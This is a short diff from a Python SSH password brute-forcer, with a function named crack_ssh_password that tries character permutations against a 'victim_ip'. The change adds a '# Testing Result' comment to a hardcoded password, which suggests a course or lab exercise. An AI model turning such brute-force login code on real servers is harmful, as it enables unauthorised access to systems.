@@ -51,7 +51,7 @@ def crack_ssh_password():
 		for j in itertools.permutations(lin, i):
 			now = ''.join(j)
 			
-			now = 'csc2022'
+			now = 'csc2022' # Testing Result
 
 			result = try_ssh_connection(
 				hostname = victim_ip,
